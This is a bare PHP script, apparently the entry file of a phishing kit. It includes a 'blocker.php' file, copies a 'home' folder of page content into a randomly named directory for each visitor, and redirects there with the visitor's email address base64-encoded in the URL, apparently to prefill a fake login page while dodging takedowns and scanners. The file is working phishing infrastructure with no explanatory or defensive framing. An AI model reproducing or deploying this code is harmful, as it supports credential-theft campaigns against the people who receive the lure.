<?php
include('blocker.php');
####################
$random = rand(0,100000000000).$_SERVER['REMOTE_ADDR'];
$dst    = substr(md5($random), 0, 11);
$dat = $_GET['email'];
$dot = base64_encode($dat);
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="home";
recurse_copy( $src, $dst );
header("location:".$dst."?94a08da1fecbb6e8b46990538c7b50b2=c4ca4238a0b923820dcc509a6f75849b&0e6ce45a0058b646e949e96fe6703cd4=fb66c97ef4941b90a6fcb709805dbb6c&id=1&email=$dot");
exit;

?>